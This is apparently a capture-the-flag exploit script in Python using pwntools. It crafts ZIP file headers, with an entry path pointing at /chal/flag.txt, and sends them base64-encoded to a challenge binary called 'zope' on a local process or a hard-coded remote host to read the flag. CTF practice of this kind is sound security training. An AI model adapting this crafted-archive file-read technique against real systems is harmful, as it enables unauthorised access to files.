#!/usr/bin/env python3
from pwn import *
from need import * 
import base64
# thing = b"UEsDBAEBAgIDAwAABQUGBgEBAQECAgICAwMDAwEBAgI="
# thing = "BANLUPDw8fHx8vP09fb3+Pnx8fHw8PHx8vLz8/T0//8="
exe = ELF("./zope")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote('172.210.129.230', 1349)
else:
    p = process([exe.path])
    input()
    gdb.attach(p, """"

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

        

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
he = lfh()
he2 = cfh()
filename = b"flag.txt"
signature = 67324752
signature2 = 33639248
extra_feild = b"lmaodark"
comment = b"hello this is a zop file"
data = b"/chal/flag.txt"
uncompressed_size = len(data)
a = base64.b64encode(he.genzip(filename,signature,extra_feild,uncompressed_size,data))
a += base64.b64encode(he2.genzip(filename,signature2,extra_feild,uncompressed_size,comment))
print(he.genzip(filename,signature,extra_feild,uncompressed_size,data))
print(a)
sla(b">>",a)






p.interactive()
# good luck pwning :)

